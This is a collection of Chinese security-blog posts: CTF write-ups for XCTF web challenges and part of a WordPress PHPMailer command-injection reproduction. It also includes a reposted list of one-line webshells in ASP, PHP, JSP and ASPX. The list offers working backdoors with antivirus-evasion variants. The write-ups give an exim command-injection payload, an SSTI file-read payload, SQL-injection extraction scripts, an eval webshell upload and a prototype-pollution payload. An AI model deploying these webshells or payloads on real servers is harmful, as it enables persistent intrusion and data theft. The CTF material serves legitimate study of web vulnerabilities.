‘additional_params’参数可用于将附加标志作为命令行选项传递给配置为在发送邮件时使用的程序，如’ sendmail_path ‘配置设置所定义的那样。例如，当使用带有’-f’ sendmail选项的sendmail时，可以使用它来设置信封发送者地址。 该参数通过escapeshellcmd()在内部转义，以防止命令执行。escapeshellcmd()阻止命令的执行，但是允许添加额外的参数。出于安全考虑，建议用户对该参数进行消毒，以避免向shell命令添加不必要的参数。 实际上phpmailer组件是调用linux系统命令sendmail进行邮件发送，命令格式为：sendmail -t -i -fusername@hostname mail() 执行后，会执行这样的指令 sendmail -t -i -fwordpress@过滤后的数据包头中的Host字段值 另外sendmail符号链接到exim4，exim4的-be参数能开启字符串扩展测试模式，允许提取一些变量数据 $tod_log返回系统时间，$spool_directory返回路径值/var/spool/exim4，因此可以用${substr{10}{1}{$tod_log}}代替空格、${substr{0}{1}{$spool_directory}}代替斜杠来绕过-be后面参数中空格和斜杠，以及run可以运行程序 因此上面提到的payload 因此上面提到的payload target(any -froot@localhost -be ${run{$payload}} null) 最后变成 sendmail -t -i -fwordpress@target(any -froot@localhost -be ${run{$payload}} null) 这样就可以执行run中的命令 如果直接在命令行里使用，需要给run加引号 ![image-20230829161640747](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230829161640747.png) 0x07 参考文章 wordpress 4.6任意命令执行漏洞（PwnScriptum）复现 WordPress &lt;= 4.6 命令执行漏洞(PHPMailer)(CVE-2016-10033)复现分析 [WordPress 4.6 任意命令执行漏洞 (PwnScriptum)](https://wuxiuo.com/archives/83) 深入分析WordPress4.6(PHPMailer)命令执行漏洞(CVE-2016-10033) Wordpress 4.6 远程代码执行漏洞（PwnScriptum）","tags":["CVE"],"categories":["CVE漏洞"]},{"title":"攻防世界-easy_web","path":"/2023/08/24/easy-web/","content":"题目描述： easy_web 题目解题： 打开后如下，dirsearch扫目录没啥效果，源代码也没用，之后看了看该项目的cms信息 那基本可以是ssti了，不过尝试的时候过滤了{}，然后我就不知道如何入手了。。。只能跟着wp走： 回归到首页发现 字符规范器，是不是找一些特殊字符可以恢复成{这种形式，就找一下跟{类似的特殊符号试一下 特殊字符网址：http://www.fhdq.net/ 可以替换成功 ︷︷config︸︸ 在测试过程中发现单引号也被过滤掉，＇这个符号可以转换出' ︷︷().__class__.__bases__[0].__subclasses__()︸︸ ︷︷().__class__.__base__.__subclasses__()︸︸返回一大堆，有人可能不知道接下来要干什么，这里看了大佬的分析,深有感触，这里返回的子类，接下来要去访问具体某一个子类的init方法，这里为什么要访问init方法呢，因为访问到init方法之后，你可以知道这个类是否被重写了，如果没有重写，会返回objecs字样，如图 类没有被重写，是继承的object类,这些类不具备open方法来操作文件，达不到我们目的，我们就是要通过open来读取flag文件，所以我们需要去一个一个看，找到重写的子类，来通过调用open方法读取文件，当然这么多子类不可能一个一个手动去试，于是写了脚本，这里去burp爆破也可，比较方便 import html import re import requests url = 'http://61.147.171.105:55725' for i in range(1, 200): data = { 'str': '︷︷().__class__.__base__.__subclasses__()[%d].__init__︸︸' % i, } res = requests.post(url=url, data=data) res_ = html.unescape(res.text) print(res_) ​ 这部分会看到所有的子类的init方法，接下来加个判断过滤一下就OK，我们接着注入，这里我们知道重写了init方法的子类后，通过.__globals__访问定义该类的模块的全局命名空间， ​ 解释下什么叫全局命名空间，在 Python 中，每个模块都有一个全局命名空间，用于存储该模块中定义的全局变量和函数。当一个类被定义在一个模块中时，它也可以访问该模块的全局命名空间中的变量和函数。所以我们可以通过访问 globals 属性来获得该模块的全局命名空间中的所有对象，包括全局变量和函数。这些对象可以被读取和修改，接下来介绍 builtins 是 Python 中一个内置的模块对象，他在python解释器启动时， builtins 对象就会被创建并且自动添加到全局命名空间中，因此 builtins 可以在认可地方访问， builtins 模块包含了很多内置函数，其中就包括我们这提要用的open（），所以我们通过__globals__来访问 builtins 模块中的open函数来达到读取flag文件的目的， if 'objects' not in res_: print(i, res_) 接下来给脚本加上这两行，就会输出重写init的子类并且加上序号，方便后续手动操作，当然脚本也可以 ok这里看到序号之后开始注入，这里选择75，当然所有输出的序号都可以用 ︷︷().__class__.__base__.__subclasses__()[75].__init__.__globals__.__builtins__︸︸ 会看到出现了很多内置函数，这里就有我们需要用的open（），接下来使用open访问flag文件读取就行了 ︷︷().__class__.__base__.__subclasses__()[75].__init__.__globals__.__builtins__[＇open＇](＇/flag＇).read()︸︸ 这里需要注意，[]和()里面的符号是＇而不是单引号（被过滤），之后就读到flag了 参考文章： 深入理解SSTI. 攻防世界easy_web 附python脚本 攻防世界–easy_web 攻防世界easy_web","categories":["攻防世界"]},{"title":"攻防世界-unfinish","path":"/2023/08/24/unfinish/","content":"题目描述： SQL 题目解题： 进入页面发现没啥信息，邮箱也必须符合正常格式，源代码也没用，因此就用dirsearch扫了一下，发现个register.php页面，此刻我就想到可能存在二次注入，毕竟就这俩页面。其次，大家也可以用awvs扫一下，也可以扫出来 确定是注入后，就是寻找注入点了，这里输入正常的注册内容抓包看一下 结合下图的页面发现会回显用户名，那基本注入点就在用户名了 用户名注册时加个单引号注册失败，双引号注册成功，说明可能为单引号闭合·， 随后就是对用户名过滤字符的fuzz了 可以看到这有这四个没有过滤，接着就开始借鉴wp了 看了看大佬的wp，翻译一下，就是通过使用0’+1+'0作为用户名，在注册的时候，猜想使用sql语句插入到表中，如： insert into tables values('$email','$username','$password') 在插入中将0’+1+‘0插入，取的时候，MySQL语言的一种特性，就是+在MySQL中是作为运算符的，引用一幅图： 如果加号运算中有字符，那么mysql就会把字符转变为数字在相加，比如select ‘1’+‘1a’;结果为2，转换过程跟php类似。 下面是几个例子： mysql&gt; select '1'+'1a'; +----------+ | '1'+'1a' | +----------+ | 2 | +----------+ 1 row in set, 1 warning (0.00 sec) mysql&gt; select '0'+database(); +----------------+ | '0'+database() | +----------------+ | 0 | +----------------+ 1 row in set (0.00 sec) 可以用截取的方法，截取处每一位，然后ascii编码。 mysql&gt; select '0'+ascii(substr(database(),1,1)); +-----------------------------------+ | '0'+ascii(substr(database(),1,1)) | +-----------------------------------+ | 100 | +-----------------------------------+ 1 row in set (0.00 sec) mysql&gt; select '0'+ascii(substr(database(),2,1)); +-----------------------------------+ | '0'+ascii(substr(database(),2,1)) | +-----------------------------------+ | 118 | +-----------------------------------+ 1 row in set (0.00 sec) 成功截取，但是逗号被过滤，该咋办。使用from...for...代替。 mysql&gt; select '0'+ascii(substr(database() from 1 for 1)); +--------------------------------------------+ | '0'+ascii(substr(database() from 1 for 1)) | +--------------------------------------------+ | 100 | +--------------------------------------------+ 1 row in set (0.00 sec) mysql&gt; select '0'+ascii(substr((database()) from 2 for 1)); +----------------------------------------------+ | '0'+ascii(substr((database()) from 2 for 1)) | +----------------------------------------------+ | 118 | +----------------------------------------------+ 1 row in set (0.00 sec) 还有可以使用十六进制转换后运算 有疑问，为啥不用二进制或者八进制。用例子来说明： mysql&gt; select bin('dvwa'); +-------------+ | bin('dvwa') | +-------------+ | 0 | +-------------+ 1 row in set (0.00 sec) mysql&gt; select oct('dvwa'); +-------------+ | oct('dvwa') | +-------------+ | 0 | +-------------+ 1 row in set (0.00 sec) mysql&gt; select hex('dvwa'); +-------------+ | hex('dvwa') | +-------------+ | 64767761 | +-------------+ 1 row in set (0.00 sec) 可以看到，只有十六进制成功转换。 但是又出来一个问题，如果十六进制转换后的字符串有字母的话，转化为数字后相加就会丢失字符。 又但是当这个长字符串转成数字型数据的时候会变成科学计数法，也就是说会丢失数据精度。 这里还可以使用分段读法。 mysql&gt; select substr(hex(hex('dvwa{}')) from 1 for 10)+'0'; +----------------------------------------------+ | substr(hex(hex('dvwa{}')) from 1 for 10)+'0' | +----------------------------------------------+ | 3634373637 | +----------------------------------------------+ 1 row in set (0.00 sec) mysql&gt; select substr(hex(hex('dvwa{}')) from 11 for 10)+'0'; +-----------------------------------------------+ | substr(hex(hex('dvwa{}')) from 11 for 10)+'0' | +-----------------------------------------------+ | 3736313742 | +-----------------------------------------------+ 1 row in set (0.00 sec) mysql&gt; select substr(hex(hex('dvwa{}')) from 21 for 10)+'0'; +-----------------------------------------------+ | substr(hex(hex('dvwa{}')) from 21 for 10)+'0' | +-----------------------------------------------+ | 3744 | +-----------------------------------------------+ 1 row in set (0.00 sec) mysql&gt; select unhex(unhex(363437363737363137423744)); +----------------------------------------+ | unhex(unhex(363437363737363137423744)) | +----------------------------------------+ | dvwa{} | +----------------------------------------+ 1 row in set (0.11 sec) 抄大佬的脚本 import requests #导入 requests 模块，用于进行 HTTP 请求。 import re\t# 导入 re 模块，用于使用正则表达式进行字符串匹配。 register_url = 'http://61.147.171.105:49466/register.php' login_url = 'http://61.147.171.105:49466/login.php' for i in range(1, 100): register_data = {# 构建注册的相关数据 'email': '111@123.com%d' % i, 'username': \"0' + ascii(substr((select * from flag) from %d for 1)) + '0\" % i, 'password': 'admin' } res = requests.post(url=register_url, data=register_data)#requests.post() 发送注册请求，并将结果保存在res中。 login_data = { 'email': '111@123.com%d' % i, 'password': 'admin' } res_ = requests.post(url=login_url, data=login_data)#requests.post() 发送登录请求，并将结果保存在 res_ 中。 # 使用正则表达式搜索 res_.text 中的 &lt;span class=\"user-name\"&gt;数字&lt;/span&gt; 的模式，提取其中的数字部分。这个数字可能是从数据库中提取的信息的一部分。 code = re.search(r'&lt;span class=\"user-name\"&gt;\\s*(\\d*)\\s*&lt;/span&gt;', res_.text) print(chr(int(code.group(1))), end='') 对代码中的group的研究： 正则 import re a = \"123abc456\" print re.search(\"([0-9]*)([a-z]*)([0-9]*)\",a).group(0) #123abc456,返回整体 print re.search(\"([0-9]*)([a-z]*)([0-9]*)\",a).group(1) #123 print re.search(\"([0-9]*)([a-z]*)([0-9]*)\",a).group(2) #abc print re.search(\"([0-9]*)([a-z]*)([0-9]*)\",a).group(3) #456 究其因 1. 正则表达式中的三组括号把匹配结果分成三组 - group() 同group（0）就是匹配正则表达式整体结果 - group(1) 列出第一个括号匹配部分，group(2) 列出第二个括号匹配部分，group(3) 列出第三个括号匹配部分。 2. 没有匹配成功的，re.search（）返回None 3. 当然郑则表达式中没有括号，group(1)肯定不对了 *表示0次或多次 \\r表示匹配原生字符串，如\\就仅表示\\，但是*和?之类就要加\\才能表示字符本身 参考文章： xctf攻防世界 Web高手进阶区 unfinish 攻防世界web进阶区unfinish详解","categories":["攻防世界"]},{"title":"攻防世界-ics-07","path":"/2023/08/24/ics-07/","content":"题目描述： 工控云管理系统项目管理页面解析漏洞 题目解题： 熟悉的页面，我们还是点击测试，发现只有项目管理可以点击 页面如图所示，这里左下角有个view-source，我们审一下源码 &lt;?php session_start();//创建新会话，或重用现有会话（cookie提交会话id时） if (!isset($_GET[page])) {//检查是否请求此页面 show_source(__FILE__);//若存在请求，语法高亮本页面（show_source作用等同于highlight_file） die(); } if (isset($_GET[page]) &amp;&amp; $_GET[page] != 'index.php') {//如果请求页面，且请求链接不为index.php include('flag.php');//解析此文件flag.php }else { header('Location: ?page=flag.php');//重定向到flag.php } ?&gt; &lt;form action=\"#\" method=\"get\"&gt; page : &lt;input type=\"text\" name=\"page\" value=\"\"&gt; id : &lt;input type=\"text\" name=\"id\" value=\"\"&gt; &lt;input type=\"submit\" name=\"submit\" value=\"submit\"&gt; &lt;/form&gt; &lt;br /&gt; &lt;a href=\"index.phps\"&gt;view-source&lt;/a&gt; &lt;?php if ($_SESSION['admin']) {//如果会话的变量是admin $con = $_POST['con']; $file = $_POST['file']; $filename = \"backup/\".$file;//文件存储于 backup/ //匹配文件名称，是否存在php3 php4 php5 php7、phtml、pht? if(preg_match('/.+\\.ph(p[3457]?|t|tml)$/i', $filename)){ die(\"Bad file extension\"); }else{ chdir('uploaded');//将当前目录改为uploaded，更改文件存储位置为/uploaded/backup $f = fopen($filename, 'w');//以写入方式打开文件，内容输出至$f fwrite($f, $con); //将$con的内容写入$f fclose($f); } } ?&gt; &lt;?php//如果 id不为空 且 id的浮点值不为1 且id的最后一个字符为9 if (isset($_GET[id]) &amp;&amp; floatval($_GET[id]) !== '1' &amp;&amp; substr($_GET[id], -1) === '9') { include 'config.php'; $id = mysql_real_escape_string($_GET[id]);//以转义字符的方式连接当前的id，传送mysql查询 $sql=\"select * from cetc007.user where id='$id'\";//从数据库里查询相应的id $result = mysql_query($sql); $result = mysql_fetch_object($result);//取出查询结果 } else { $result = False; die(); } if(!$result)die(\"&lt;br &gt;something wae wrong ! &lt;br&gt;\"); if($result){ echo \"id: \".$result-&gt;id.\"&lt;/br&gt;\"; echo \"name:\".$result-&gt;user.\"&lt;/br&gt;\"; $_SESSION['admin'] = True;//需要满足id查询的名称为admin } ?&gt; 由$_SESSION[‘admin’] = True;可知，只有查询id时对应有结果，那就会设置admin的session对话，这是我们文件上传的突破点，那一般来说id应该就是1，此处你结合代码floatval($_GET[id]) !== '1'也能知道，既然对1有所限制，那我们应该就是要查询id=1的内容 floatval — 获取变量的浮点值 float floatval( mixed $var) 返回变量 var 的 float 数值。 var 可以是任何标量类型。你不能将 floatval() 用于数组或对象。 &lt;?php $var = '122.34343The'; $float_value_of_var = floatval ($var); print $float_value_of_var; // 打印出 122.34343 ?&gt; 因此可以将id赋值为1a9 页面有所回显，此刻我们便可以进行文件上传，上传时先来看看如何绕过正则，结合题目信息，这里说是有文件解析漏洞，那我们应当找一下该项目是由哪个中间件写的 这就好办了。 Apache解析漏洞 原理： Apache 解析文件的规则是从右到左开始判断解析，如果后缀名为不可识别文件解析，就再往左判断。比如test.php.a.b的“.a”和“.b”这两种后缀是apache不能识别解析，apache就会把test.php.a.b解析成test.php。 上传成功以后，页面并不会有任何回显，需要输入$con的上传网址查看自己的文件 但似乎这里并没有被当做php解析，蚁剑连接不上去，看了wp发现payload如下 con=&lt;?php @eval($_POST[1]);?&gt;&amp;file=shell.php/. 这回成功解析为php，蚁剑也成功连接 拿到flag 总结 php的解释器可以解析：php、php3、php4、php5、php7、phtml、pht、phs、shtml、pwml，不过本题都对此过滤了。 也有大佬根据apache2.x的解析漏洞，补充了不可识别的文件格式~例如1.php.1（有大佬以截断形式输入，1.php/.，上传后显示为1.php） 绕过方式`../filename.php/.`或者`filename.php/.` 绕过原理:文件名中不允许带有/ 因为/表示目录的分割符 在php中，如果保存的文件中含有/ 会自动省略/后面的内容，/后面的.是为了达到匹配最后一个.的效果 参考文章： wp参考一 wp参考二 wp参考三","categories":["攻防世界"]},{"title":"一句话木马大全","path":"/2023/08/23/web-ji-qiao-zong-jie/","content":"转载请注明出处：https://blog.csdn.net/l1028386804/article/details/84206143 &lt;%eval request(\"c\")%&gt; &lt;%execute request(\"c\")%&gt; &lt;%execute(request(\"c\"))%&gt; &lt;%ExecuteGlobal request(\"sb\")%&gt; %&gt;&lt;%Eval(Request(chr(35)))%&gt;&lt;% &lt;%if request (\"c\")&lt;&gt;\"\"then session(\"c\")=request(\"c\"):end if:if session(\"c\")&lt;&gt;\"\" then execute session(\"c\")%&gt; &lt;%eval(Request.Item[\"c\"],\"unsafe\");%&gt; '备份专用 &lt;%eval(request(\"c\")):response.end%&gt; '无防下载表,有防下载表突破专用一句话 &lt;%execute request(\"c\")%&gt;&lt;%&lt;%loop&lt;%:%&gt; &lt;%&lt;%loop&lt;%:%&gt;&lt;%execute request(\"c\")%&gt; &lt;%execute request(\"c\")&lt;%loop&lt;%:%&gt; '防杀防扫专用 &lt;%if Request(\"c\")&lt;&gt;\"\" ThenExecuteGlobal(Request(\"c\"))%&gt; '不用\"&lt;,&gt;\" &lt;script language=VBScript runat=server&gt;execute request(\"c\")&lt;/script&gt; &lt;% @Language=\"JavaScript\" CodePage=\"65001\"var lcx={'名字':Request.form('#'),'性别':eval,'年龄':'18','昵称':'请叫我一声老大'};lcx.性别((lcx. 名字)+'') %&gt; &lt;script language=vbs runat=server&gt;eval(request(\"c\"))&lt;/script&gt; &lt;script language=vbs runat=server&gt;eval_r(request(\"c\"))&lt;/script&gt; '不用双引号 &lt;%eval request(chr(35))%&gt; '可以躲过雷客图 &lt;%set ms = server.CreateObject(\"MSScriptControl.ScriptControl.1\") ms.Language=\"VBScript\" ms.AddObject\"response\",response ms.AddObject \"request\",request ms.ExecuteStatement(\"ev\"&amp;\"al(request(\"\"c\"\"))\")%&gt; &lt;%dy=request(\"dy\")%&gt;&lt;%Eval(dy)%&gt; '容错代码 if Request(\"sb\")&lt;&gt;\"\" then ExecuteGlobal request(\"sb\") end if PHP一句话 &lt;?php eval($_POST1);?&gt; &lt;?php if(isset($_POST['c'])){eval($_POST['c']);}?&gt; &lt;?php system($_REQUEST1);?&gt; &lt;?php ($_=@$_GET1).@$_($_POST1)?&gt; &lt;?php eval_r($_POST1)?&gt; &lt;?php @eval_r($_POST1)?&gt;//容错代码 &lt;?php assert($_POST1);?&gt;//使用Lanker一句话客户端的专家模式执行相关的PHP语句 &lt;?$_POST['c']($_POST['cc']);?&gt; &lt;?$_POST['c']($_POST['cc'],$_POST['cc'])?&gt; &lt;?php @preg_replace(\"/[email]/e\",$_POST['h'],\"error\");?&gt;/*使用这个后,使用菜刀一句话客户端在配置连接的时候在\"配置\"一栏输入*/:&lt;O&gt;h=@eval_r($_POST1);&lt;/O&gt; &lt;?php echo `$_GET['r']` ?&gt; //绕过&lt;?限制的一句话 &lt;script language=\"php\"&gt;@eval($_POST[sb])&lt;/script&gt; //绕过&lt;?php ?&gt;限制的一句话 &lt;?=eval($_POST['cmd']); JSP一句话 &lt;%if(request.getParameter(\"f\")!=null)(newjava.io.FileOutputStream (application.getRealPath(\"\\\\\")+request.getParameter(\"f\"))).write (request.getParameter(\"t\").getBytes());%&gt; 提交客户端 &lt;form action=\"\" method=\"post\"&gt;&lt;textareaname=\"t\"&gt;&lt;/textarea&gt;&lt;br/&gt;&lt;input type=\"submit\"value=\"提交\"&gt;&lt;/form&gt; ASPX一句话 &lt;script language=\"C#\"runat=\"server\"&gt;WebAdmin2Y.x.y a=new WebAdmin2Y.x.y(\"add6bb58e139be10\")&lt;/script&gt; 普通的php一句话：&lt;?php @eval($_POST['r00ts']);?&gt; 普通的asp一句话：&lt;%eval(Request.Item[\"r00ts\"],”unsafe”);%&gt; aspx突破一流的： dim da set fso=server.createobject(\"scripting.filesystemobject\") path=request(\"path\") if path&lt;&gt;\"\" then data=request(\"da\") set da=fso.createtextfile(path,true) da.write data if err=0 then Response.Write \"yes\" else Response.Write \"no\" end if err.clear end if set da=nothing set fos=nothing Response.Write \"&lt;form action=\" method=post&gt;\" Response.Write \"&lt;input type=text name=path&gt;\" Response.Write \"&lt;br&gt;\" Response.Write \"当前文件路径:\"&amp;server.mappath(request.servervariables(\"script_name\")) Response.Write \"&lt;br&gt;\" Response.Write \"操作系统为:\"&amp;Request.ServerVariables(\"OS\") Response.Write \"&lt;br&gt;\" Response.Write \"WEB服务器版本为:\"&amp;Request.ServerVariables(\"SERVER_SOFTWARE\") Response.Write \"&lt;br&gt;\" Response.Write \"&lt;textarea name=da cols=50 rows=10 width=30&gt;&lt;/textarea&gt;\" Response.Write \"&lt;br&gt;\" Response.Write \"&lt;input type=submit value=save&gt;\" Response.Write \"&lt;/form&gt;\" &lt;/Script&gt; ASP一句话:&lt;%IfRequest(“1″)&lt;&gt;”\"ThenExecuteGlobal(Request(“1″))%&gt; PHP防杀放扫 一句话：&lt;?php (])?&gt; 上面这句是防杀防扫的！网上很少人用！可以插在网页任何ASP文件的最底部不会出错，比如 index.asp里面也是可以的！ 因为加了判断！加了判断的PHP一句话，与上面的ASP一句话相同道理，也是可以插在任何PHP文件 的最底部不会出错！&lt;?if(isset($_POST['1'])){eval($_POST['1']);}?&gt;&lt;?php system($_REQUEST[1]);?&gt; 无防下载表，有防下载表可尝试插入以下语句突破的一句话 &lt;%execute request(“class”)%&gt;&lt;%'&lt;% loop &lt;%:%&gt;&lt;%'&lt;% loop &lt;%:%&gt;&lt;%execute request(“class”)%&gt;&lt;%execute request(“class”)'&lt;% loop &lt;%:%&gt; 备份专用&lt;%eval(request(“1″)):response.end%&gt; asp一句话&lt;%execute(request(“1″))%&gt; aspx一句话:&lt;scriptrunat=”server”&gt;WebAdmin2Y.x.y aaaaa =newWebAdmin2Y.x.y(“add6bb58e139be10″);&lt;/script&gt; 可以躲过雷客图的一句话。 &lt;%set ms = server.CreateObject(“MSScriptControl.ScriptControl.1″) ms.Language=”VBScript”ms.AddObject”Response”,Responsems.AddObject”request”, requestms.ExecuteStatement(“ev”&amp;”al(request(“”1″”))”)%&gt; 不用'&lt;,&gt;‘的asp一句话&lt;scriptrunat=server&gt;execute request(“1″)&lt;/script&gt; 不用双引号的一句话。&lt;%eval request(chr(35))%&gt;","tags":["基本知识"],"categories":["web知识总结"]},{"title":"攻防世界-bug","path":"/2023/08/23/bug/","content":"题目描述： 无 题目解题： 打开题目依旧是登录页面，先测试弱口令，没反应，随后扫目录的同时看看是否为sql，但很明显也不是，于是随便注册了一个用户，用来抓包看看是否存在逻辑漏洞 cookie解密更改 这里一看uid之类的，就感觉是逻辑漏洞了，不过我还是借鉴了wp，随后他说这个cookie中的user像是md5加密，于是乎我解密一番看看 试了很多网站都解密不成功，看来只能靠猜，这里幸运的话猜到是有\"UID:用户名\"加密而成 幸运的话在这里对\"1:admin\"进行加密修改cookie就可以直接看到admin用户的信息，随后就可以重置密码，不过这条路不太好走，换一条简单的 重置密码的越权 我们将我们注册过的用户输入进去进行密码重置看能否实现越权，在这里尝试的原因在于，别处的功能点均不存在越权漏洞。 修改密码后bp抓包 在这里修改为admin，admin看看 发现成功了，那我们登录一下看看 登录进去后，发现点击manage显示ip错误，无权访问，那估计就是修改xff或者ssrf了，那我们抓包看看 发现有效果，看一下源码 发现module的值为文件管理，如果是佬的话凭直觉认为是文件上传，所以他们会将do赋值为upload，果然还真成功了 wp是这样说的： 成功绕过IP检测后，能看见侧着的笑脸和Where Is The Flag?的字样。在源码中隐藏了另一个信息index.php?module=filemanage&amp;do=???.文件类型的action通常都是upload，故访问index.php?module=filemanage&amp;do=upload页面，在新页面中能进行文件上传。 随便上传一个php文件测试 发现有过滤，那我们先更改后缀看看，这里用00截断看看 发现成功，然后又说我们的文件类型不对，于是我改为上述图片的，发现依旧不行，那可能就是文件内容也有过滤，这里就看了wp的 将文件内容修改为&lt;script language='php'&gt;&lt;/script&gt;，绕过&lt;?的限制 以为成功了，结果非得将文件类型修改为png才可以 怎么说，做了一次下来，有点实战的味道 参考文章： wp参考一 wp参考二 一句话木马大全","categories":["攻防世界"]},{"title":"攻防世界-wife_wife","path":"/2023/08/23/wife-wife/","content":"题目描述： cat-wifi 本题不需要爆破 题目解题： 打开是一个登录页面，先测试弱口令，没用，于是扫网站的同时，看看会不会是sql，测试一番啥也没有，源代码也没信息，那就看看注册页面 这里也没啥利用的，就是有个is admin的按钮，输入有效邀请码才能进入，这思路很明显，就是以管理员的身份登录进去肯定就能得到flag。唉，我也就分析到这儿了，同时抓包看了看 发现是个json数据格式，但没啥思路无从下手，还是靠wp度日吧。。。 看了wp发现是原型链污染。。。虽然说做过类似的题，但并不擅长 原型链污染 原型链污染参考 造成这个漏洞的有一个很重要的前提，这题目的后端是node.js来写的，也就是说后端不是php服务器，不是java服务器，而是JavaScript服务器 因为是JavaScript语言来处理后端+用JavaScript的那个函数来处理，所以才有这个漏洞产生 如下代码，prototype是newClass类的一个属性。newClass 实例化的对象 newObj 的 .proto 指向 newClass 类的 prototype function newClass() {this.test = 1;}var newObj = new newClass(); JSON 解析的情况下，proto 会被认为是一个真正的“键名”，而不代表“原型”。如果是let o2 = {a: 1, “proto”: {b: 2}}则__proto__会被认为是o2的原型。如果作为键名（不会被解析）就会作为子类的原型 let o1 = {} let o2 = JSON.parse('{\"a\": 1, \"__proto__\": {\"b\": 2}}') merge(o1, o2) console.log(o1.a, o1.b)o3 = {} console.log(o3.b) merge用于合并对象 merge 操作是最常见可能控制键名的操作，也最能被原型链攻击，很多常见的库都存在这个问题。 看一下实例： baseUser = { a:1 } user = { a:2, b:1, __proto__:{ c:3 } } // 这个函数的作用：浅复制一个对象，第一个参数位是对象的内容，后面的参数位是多个对象内容叠加进去，进行复制出一个全新的对象 let newUser = Object.assign({}, baseUser, user) // 无污染，结果正常 console.log(newUser) // {a: 2, b: 1} // 无污染，结果正常 console.log(newUser.__proto__) // {constructor: ƒ, __defineGetter__: ƒ, __defineSetter__: ƒ, hasOwnProperty: ƒ, __lookupGetter__: ƒ, …} 可问题是，后端服务器是JavaScript，我们通过post发送过去的 json是字符串，JavaScript需要通过JSON.parse()函数才能把 json字符串转成对象 baseUser = { a:1 } // 这次使用函数把json字符串转成对象，就出问题了， user = JSON.parse(' {\"a\" : 2 , \"b\" : 3 , \"__proto__\" : { \"c\" : 4 }} ') // 这个函数的作用：浅复制一个对象，第一个参数位是对象的内容，后面的参数位是多个对象内容叠加进去，进行复制出一个全新的对象 let newUser = Object.assign({}, baseUser, user) console.log(newUser) // {a: 2, b: 1} ，__proto__是隐藏属性，是不会直接显示的 console.log(newUser.__proto__) // {c: 4} ，但是一打印就出来了 console.log(newUser.c) // 4 ，已经被污染了，这个属性是一直存在的 题目源码 跟着wp学学源码 // post请求的路径 app.post('/register', (req, res) =&gt; { let user = JSON.parse(req.body) // 把我们输入的账号密码，从json字符串转成对象 // 判断我们有没有输入账号和密码 if (!user.username || !user.password) { return res.json({ msg: 'empty username or password', err: true }) } // 判断账号是否存在总对象的username里，如果相同的username就是重复用户名了 if (users.filter(u =&gt; u.username == user.username).length) { return res.json({ msg: 'username already exists', err: true }) } // isAdmin是否true 与 邀请码是不是等于这个常量，所以sql注入没用，邀请码是个常量 if (user.isAdmin &amp;&amp; user.inviteCode != INVITE_CODE) { user.isAdmin = false return res.json({ msg: 'invalid invite code', err: true }) } // 使用系统函数复制对象，打包成一个新的对象 let newUser = Object.assign({}, baseUser, user) users.push(newUser) // 存到总对象里 res.json({ msg: 'user created successfully', err: false }) // 设置返回信息 }) 看了这部分源码能判断出，如果这个登陆的对象里，isAdmin的属性是true，那就证明是一个管理员，如果是普通注册的用户，isAdmin属性是false，那我们直接修改user原型的属性的值，那么该类的属性的值也就随着变了，payload如下 {\"username\":\"bcx\",\"password\":\"123\",\"__proto__\":{\"isAdmin\":true}} 成功拿到flag 不过看了很多文章也没人说明是如何发现原型链的，看来应该是佬们做题多了的直觉吧。。。，不过倒是可以靠如下的插件看到这里用的是node.js语言，并且也没有数据库。 参考文章： wp参考一 wp参考二","categories":["攻防世界"]},{"title":"攻防世界-ez_curl","path":"/2023/08/23/ez-curl/","content":"题目描述： 无 题目解题： &lt;?php highlight_file(__FILE__); $url = 'http://back-end:3000/flag?'; $input = file_get_contents('php://input'); $headers = (array)json_decode($input)-&gt;headers; //取出名为 headers 的属性值，并将其转换为数组 for($i = 0; $i &lt; count($headers); $i++){ $offset = stripos($headers[$i], ':'); //确定冒号首次出现的位置 $key = substr($headers[$i], 0, $offset); //取出冒号之前的内容 $value = substr($headers[$i], $offset + 1);//取出冒号之后的内容 if(stripos($key, 'admin') &gt; -1 &amp;&amp; stripos($value, 'true') &gt; -1){ die('try hard'); } } $params = (array)json_decode($input)-&gt;params; //同上 ///使用 http_build_query() 函数将解析出的 params 数组转换为查询字符串，并将其追加到 $url 后面。 $url .= http_build_query($params); $url .= '&amp;admin=false'; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);//此处为创建并初始化curl对话，配置相关选项 curl_setopt($ch, CURLOPT_TIMEOUT_MS, 5000); curl_setopt($ch, CURLOPT_NOBODY, FALSE); $result = curl_exec($ch);//执行curl请求，并将返回的结果保存在变量中 curl_close($ch);//关闭对话 echo $result; try hard1 这里先看一下题目给的附件 app.js const express = require('express');//导入了 express 模块，也就是一个Node.js web 框架 const app = express();//创建 Express 应用实例 const port = 3000;//定义端口和 flag const flag = process.env.flag;//取出环境变量中的flag //使用 app.get() 方法定义了一个路由，该路由监听路径 /flag 的 GET 请求，当接收到这个请求时，会触发回调函数。 app.get('/flag', (req, res) =&gt; { //如果query属性的admin参数其值不含false，且请求头中的admin字段的值为true则输入flag if(!req.query.admin.includes('false') &amp;&amp; req.headers.admin.includes('true')){ res.send(flag); }else{ res.send('try hard'); } }); app.listen({ port: port , host: '0.0.0.0'});//使用 app.listen() 方法启动服务器，监听指定的端口和主机 审完也没啥思路，扫目录也没啥信息，思考了一会儿，只是感觉应该是抓包修改一下某些信息，令监听的服务器返回flag，所以借鉴wp吧 先看一下php代码，有一个file_get_contents(‘php://input’)，这是一个文件包含，当Content-Type为application/x-www-form-urlencoded且提交方法是POST方法时，$_POST数据与php://input数据是一致的。 然后会$headers = (array)json_decode($input)-&gt;headers把post过去的数据解码成数组，很明显post的内容就是http请求里的headers，写post数据的时候要写成json的形式。像这样： {\"headers\": [\"admin:true\"]} express框架 Express是一个流行的Node.js Web框架，它提供了许多有用的功能来构建Web应用程序。其中之一是参数解析，它允许开发者解析HTTP请求中的参数。Express提供了许多选项来配置参数解析。其中之一是parameterLimit选项。 parameterLimit选项用于指定query string或者request payload的最大数量。默认情况下，它的值是1000。如果你的应用程序需要解析大量的查询字符串或者请求负载，你可能需要增加这个限制。例如，如果你的应用程序需要处理非常长的查询字符串，你可以将parameterLimit设置为一个更高的值。 以下是一个示例，演示如何使用parameterLimit选项来增加query string和request payload的限制： const express = require('express') const app = express() // 将parameterLimit设置为10000 app.use(express.json({ parameterLimit: 10000 })) app.use(express.urlencoded({ parameterLimit: 10000, extended: true })) 在上面的代码中，我们将parameterLimit设置为10000。这将允许我们解析更大的请求负载和查询字符串。 需要注意的是，如果你将parameterLimit设置为一个非常高的值，可能会导致安全问题。攻击者可以发送恶意请求，包含大量参数，导致服务器崩溃。因此，你应该谨慎地设置参数限制，并确保你的应用程序具有有效的安全措施，以防止此类攻击。 